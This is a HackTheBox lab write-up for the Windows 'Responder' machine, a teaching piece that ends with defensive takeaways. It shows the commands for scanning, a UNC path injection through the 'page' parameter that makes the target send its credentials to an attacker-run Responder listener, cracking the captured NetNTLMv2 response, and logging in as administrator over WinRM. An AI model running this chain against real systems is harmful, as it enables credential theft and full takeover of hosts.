# Responder

This is a HackTheBox Starting Point lab focused on Windows web enumeration, unsafe file inclusion, NTLM authentication capture, offline password cracking, and authenticated access through WinRM.

## Lab Summary

| Item | Detail |
| --- | --- |
| Platform | HackTheBox |
| Machine | Responder |
| Target | `10.129.132.155` |
| Hostname | `unika.htb` |
| Operating System | Windows |
| Initial Vector | UNC path injection through the `page` parameter |
| Final Access | Administrator through WinRM |
| Testing Date | 2026-09-17 |

## Reconnaissance

I started with RustScan and passed the discovered ports to Nmap for default scripts and service detection.

```bash
target=10.129.132.155
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified two open TCP ports:

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0
```

Port `80` exposed an Apache and PHP web application, while port `5985` indicated that Windows Remote Management was available.

## Hostname Resolution

The web application used the virtual host `unika.htb`. I mapped it to the target in `/etc/hosts`:

```bash
echo "$target unika.htb" | sudo tee -a /etc/hosts
```

## File Inclusion and UNC Path Injection

The application accepted a page name through the `page` query parameter. On Windows, a path beginning with `//` can be interpreted as a UNC network path. Supplying an attacker-controlled UNC path caused the server to attempt an SMB connection to the attacking host.

I started Responder on the VPN interface:

```bash
sudo responder -I tun0
```

The listener address was `10.10.15.184`. I then requested an SMB path through the vulnerable parameter:

```text
http://unika.htb/index.php?page=//10.10.15.184/hi
```

The target attempted to authenticate to the Responder SMB service and disclosed an NTLMv2 challenge-response for the local Administrator account:

```text
[SMB] NTLMv2-SSP Client   : 10.129.132.155
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:5935f81237a30e4e:...
```

This was not the plaintext password or a reusable NTLM password hash. It was a NetNTLMv2 challenge-response suitable for offline password guessing.

## Offline Password Cracking

I saved the captured response to a file named `hash` and tested it against the `rockyou.txt` wordlist with John the Ripper:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```

John recovered the Administrator password:

```text
badminton        (Administrator)
```

## WinRM Access

Because WinRM was exposed on port `5985`, I tested the recovered credentials with Evil-WinRM:

```bash
evil-winrm -i $target -u administrator -p badminton
```

Authentication succeeded and returned a PowerShell session as the local Administrator account:

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

No separate privilege-escalation step was required because the captured and cracked credential already belonged to an administrator.

## Flag

The proof file was located on Mike's desktop:

```powershell
cd C:\Users\mike\Desktop
type flag.txt
```

```text
ea81b7afddd03efaa0945333ed147fac
```

## Attack Path

```text
RustScan and Nmap
        |
        v
Apache/PHP and WinRM discovered
        |
        v
unika.htb virtual host configured
        |
        v
Unsafe page parameter accepts a UNC path
        |
        v
Target authenticates to attacker-controlled SMB service
        |
        v
Administrator NetNTLMv2 response captured
        |
        v
Weak password cracked offline
        |
        v
Administrator login through WinRM
        |
        v
Proof file retrieved
```

## Key Takeaways

- File inclusion on Windows can be abused with UNC paths to trigger outbound SMB authentication.
- A captured NetNTLMv2 response is not a plaintext password, but weak passwords may still be recovered offline.
- Remote management services such as WinRM greatly increase the impact of compromised administrative credentials.
- File parameters should use strict allowlists and server-side mappings instead of accepting user-controlled paths.
- Outbound SMB should be blocked from web servers unless it is explicitly required.

## Related Report

- [Responder Penetration Test Report](../../../reports/hackthebox/responder-pentest-report.md)

## Disclaimer

This writeup documents activity performed in an authorized HackTheBox lab environment for educational purposes.
